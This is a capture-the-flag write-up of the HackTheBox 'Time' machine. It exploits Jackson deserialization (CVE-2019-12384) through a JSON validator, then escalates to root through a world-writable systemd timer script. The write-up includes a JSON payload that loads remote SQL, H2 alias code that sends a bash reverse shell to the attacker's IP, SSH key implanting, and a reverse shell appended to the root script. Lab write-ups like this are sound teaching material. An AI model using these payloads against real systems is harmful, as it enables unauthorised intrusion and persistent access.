-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-time/</guid>
-      <description>Deserialization attack on Jackson library</description>
-      <content:encoded><![CDATA[<p>Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I&rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>Deserialization Attack</li>
-<li>Mitigation CVE-2019-12384</li>
-<li>Exploiting Systemd timers</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-<li>Nmap - Preinstalled in Kali Linux</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
-$ mkdir nmap; nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-08 07:29 EDT
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.214
-Host is up <span style="color:#f92672">(</span>0.069s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">998</span> closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
-|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
-|_http-title: Online JSON parser
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.18 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
-<p><img class="img-container" src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  />
-</p>
-<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
-<p><img class="img-container" src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  />
-</p>
-<h4 id="testing-inputs">Testing Inputs</h4>
-<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
-<p><img class="img-container" src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  />
-</p>
-<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
-</code></pre></div><p><img class="img-container" src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  />
-</p>
-<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[ 
-<span style="color:#e6db74">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span>,
-{ <span style="color:#f92672">&#34;make&#34;</span>: <span style="color:#e6db74">&#34;Isuzu&#34;</span>, <span style="color:#f92672">&#34;model&#34;</span>: <span style="color:#e6db74">&#34;NQR&#34;</span>,<span style="color:#f92672">&#34;payloadCapacity&#34;</span>: <span style="color:#ae81ff">7500.0</span> }
-]
-</code></pre></div><p>And now it returns a different error message.</p>
-<p><img class="img-container" src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  />
-</p>
-<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
-<h4 id="finding-vulnerability">Finding Vulnerability</h4>
-<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
-<ul>
-<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
-<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
-</ul>
-<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
-<p>Below is the example payload used.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span>}]
-</code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-pericles">Shell as pericles</h3>
-<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
-<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
-<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
-<p><code>inject.sql</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
-	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
-	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
-	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
-$$<span style="color:#f92672">;</span>
-CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>id <span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
-</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
-$ python3 -m http.server <span style="color:#ae81ff">80</span>
-Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
-</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">[<span style="color:#e6db74">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span>, {<span style="color:#f92672">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span>}]
-</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
-<p><img class="img-container" src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  />
-</p>
-<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
-<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
-<p>Now with the following <code>inject.sql</code>,</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">CREATE ALIAS SHELLEXEC AS $$ String <span style="color:#a6e22e">shellexec</span><span style="color:#f92672">(</span>String cmd<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IOException</span> <span style="color:#f92672">{</span>
-	String<span style="color:#f92672">[]</span> command <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> cmd<span style="color:#f92672">};</span>
-	java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>command<span style="color:#f92672">).</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
-	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>  <span style="color:#f92672">}</span>
-$$<span style="color:#f92672">;</span>
-CALL <span style="color:#a6e22e">SHELLEXEC</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">&#39;</span>bash <span style="color:#f92672">-</span>i <span style="color:#f92672">&gt;&amp;</span> <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>tcp<span style="color:#f92672">/</span>10<span style="color:#f92672">.</span><span style="color:#a6e22e">10</span><span style="color:#f92672">.</span><span style="color:#a6e22e">14</span><span style="color:#f92672">.</span><span style="color:#a6e22e">19</span><span style="color:#f92672">/</span>9000 0<span style="color:#f92672">&gt;&amp;</span>1<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span>
-</code></pre></div><p>I can obtain an interactive shell.</p>
-<pre><code>→ root@kali «time» «10.10.14.19» 
-$ nc -nvlp 9000            
-listening on [any] 9000 ...
-connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 42496
-bash: cannot set terminal process group (944): Inappropriate ioctl for device
-bash: no job control in this shell
-pericles@time:/var/www/html$ 
-</code></pre><p><img class="img-container" src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  />
-</p>
-<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
-<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ mkdir .ssh
-pericles@time:/home/pericles$
-pericles@time:/home/pericles$ echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
-</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
-$ ssh pericles@10.10.10.214 
-Welcome to Ubuntu 20.04 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-52-generic x86_64<span style="color:#f92672">)</span>
-
-...&lt;SNIP&gt;...
-  System load:             0.0
-  Usage of /:              21.2% of 27.43GB
-  Memory usage:            16%
-  Swap usage:              0%
-  Processes:               <span style="color:#ae81ff">235</span>
-  Users logged in:         <span style="color:#ae81ff">0</span>
-  IPv4 address <span style="color:#66d9ef">for</span> ens160: 10.10.10.214
-  IPv6 address <span style="color:#66d9ef">for</span> ens160: dead:beef::250:56ff:feb9:a553
-
-...&lt;SNIP&gt;...
-Last login: Fri Oct <span style="color:#ae81ff">23</span> 09:19:19 <span style="color:#ae81ff">2020</span> from 10.10.14.5
-pericles@time:~$ id
-uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>pericles<span style="color:#f92672">)</span>
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p><code>pericles</code> is the only user on this box.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ cat /etc/passwd | grep sh$
-cat /etc/passwd | grep sh$
-root:x:0:0:root:/root:/bin/bash
-pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
-</code></pre></div><p>While searching files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null |grep -v <span style="color:#e6db74">&#39;proc\|sys&#39;</span>
-/usr/bin/timer_backup.sh
-/dev/shm/payloadds9LXy
-/home/pericles/.gnupg/trustdb.gpg
-/home/pericles/.gnupg/pubring.kbx
-/home/pericles/.bashrc
-...&lt;SNIP&gt;...
-</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ cat /usr/bin/timer_backup.sh
-<span style="color:#75715e">#!/bin/bash</span>
-zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
-</code></pre></div><p>Interestingly, that script is writable by others.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
--rwxrw-rw- <span style="color:#ae81ff">1</span> pericles pericles <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:05 /usr/bin/timer_backup.sh
-</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -name <span style="color:#e6db74">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
-   <span style="color:#ae81ff">795750</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">214</span> Oct <span style="color:#ae81ff">23</span> 06:46 /etc/systemd/system/timer_backup.timer
-   <span style="color:#ae81ff">787186</span>      <span style="color:#ae81ff">4</span> -rw-r--r--   <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">159</span> Oct <span style="color:#ae81ff">23</span> 05:59 /etc/systemd/system/timer_backup.service
-  <span style="color:#ae81ff">1317302</span>      <span style="color:#ae81ff">4</span> -rwxrw-rw-   <span style="color:#ae81ff">1</span> pericles pericles       <span style="color:#ae81ff">88</span> Apr <span style="color:#ae81ff">10</span> 21:10 /usr/bin/timer_backup.sh
-</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
-[Unit]
-Description=Backup of the website
-Requires=timer_backup.service
-
-[Timer]
-Unit=timer_backup.service
-#OnBootSec=10s
-#OnUnitActiveSec=10s
-OnUnitInactiveSec=10s
-AccuracySec=1ms
-
-[Install]
-WantedBy=timers.target
-</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
-[Unit]
-Description=Calls website backup
-Wants=timer_backup.timer
-WantedBy=multi-user.target
-
-[Service]
-ExecStart=/usr/bin/systemctl restart web_backup.service
-</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/web_backup.service
-[Unit]
-Description=Creates backups of the website
-
-[Service]
-ExecStart=/bin/bash /usr/bin/timer_backup.sh
-</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
-<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pericles@time:~$ echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
-pericles@time:~$ 
-pericles@time:~$ cat /usr/bin/timer_backup.sh 
-<span style="color:#75715e">#!/bin/bash</span>
-zip -r website.bak.zip /var/www/html <span style="color:#f92672">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
-bash -i &gt;&amp; /dev/tcp/10.10.14.72/9002 0&gt;&amp;<span style="color:#ae81ff">1</span>
-</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
-$ rlwrap nc -nvlp <span style="color:#ae81ff">9002</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9002</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.72<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.214<span style="color:#f92672">]</span> <span style="color:#ae81ff">57648</span>
-bash: cannot set terminal process group <span style="color:#f92672">(</span>411032<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
-bash: no job control in this shell
-root@time:/# 
-root@time:/# exit
-</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
-$ nc -nvlp <span style="color:#ae81ff">9002</span>                          
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9002</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.19<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.214<span style="color:#f92672">]</span> <span style="color:#ae81ff">34182</span>
-bash: cannot set terminal process group <span style="color:#f92672">(</span>65312<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
-bash: no job control in this shell
-root@time:/#  echo <span style="color:#e6db74">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; /root/.ssh/authorized_keys
-&lt;rj6mXxSIGq3E5ks1g+moK<span style="color:#960050;background-color:#1e0010">&#39;</span> &gt; /root/.ssh/authorized_keys
-root@time:/# exit
-</code></pre></div><p>After that, I can login as root via SSH.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
-$ ssh root@10.10.10.214
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)
-
-...&lt;SNIP&gt;...
-  System load:             0.0
-  Usage of /:              21.2% of 27.43GB
-  Memory usage:            16%
-  Swap usage:              0%
-  Processes:               235
-  Users logged in:         0
-  IPv4 address for ens160: 10.10.10.214
-  IPv6 address for ens160: dead:beef::250:56ff:feb9:a553
-
-
-...&lt;SNIP&gt;...
-Last login: Tue Feb  9 14:41:33 2021
-root@time:~# id
-uid=0(root) gid=0(root) groups=0(root)
-root@time:~# cut -c-16 root.txt 
-27375f967f43232f
-</code></pre></div><h2 id="extras">Extras</h2>
-<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
-<h3 id="cve-2019-12384">CVE-2019-12384</h3>
-<h4 id="causes">Causes</h4>
-<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
-<p><img class="img-container" src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  />
-</p>
-<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;data&#39;</span>])){
-        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;mode&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;mode&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;2&#34;</span>){
-                $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">tempnam</span>(<span style="color:#e6db74">&#34;/dev/shm&#34;</span>, <span style="color:#e6db74">&#34;payload&#34;</span>);
-                $myfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($filename, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Unable to open file!&#34;</span>);
-                $txt <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>]; <span style="color:#75715e">// Condition #1,  $txt controlled by user. no filter
-</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">fwrite</span>($myfile, $txt); 
-                <span style="color:#a6e22e">fclose</span>($myfile);
-                <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span style="color:#e6db74">$filename</span><span style="color:#e6db74"> 2&gt;&amp;1&#34;</span>, $cmdout, $ret);
-                <span style="color:#a6e22e">unlink</span>($filename);
-                <span style="color:#66d9ef">if</span>($ret <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>){
-                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span>;
-                }
-                <span style="color:#66d9ef">else</span>{
-                        $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span style="color:#f92672">.</span> $cmdout[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
-                }
-        }
-        <span style="color:#66d9ef">else</span>{
-                $json_ugly <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;data&#39;</span>];
-                $json_pretty <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>(<span style="color:#a6e22e">json_decode</span>($json_ugly), <span style="color:#a6e22e">JSON_PRETTY_PRINT</span>);
-                $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span><span style="color:#f92672">.</span>$json_pretty<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span>;
-        }
-
-}
-<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...
-</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;java&#39;</span>
-
-<span style="color:#66d9ef">Dir</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/opt/json_project/classpath/*.jar&#34;</span><span style="color:#f92672">].</span>each <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>f<span style="color:#f92672">|</span>
-      require f
-<span style="color:#66d9ef">end</span>
-
-java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
-java_import <span style="color:#e6db74">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
-f <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(<span style="color:#66d9ef">ARGV</span><span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>)
-content <span style="color:#f92672">=</span> f
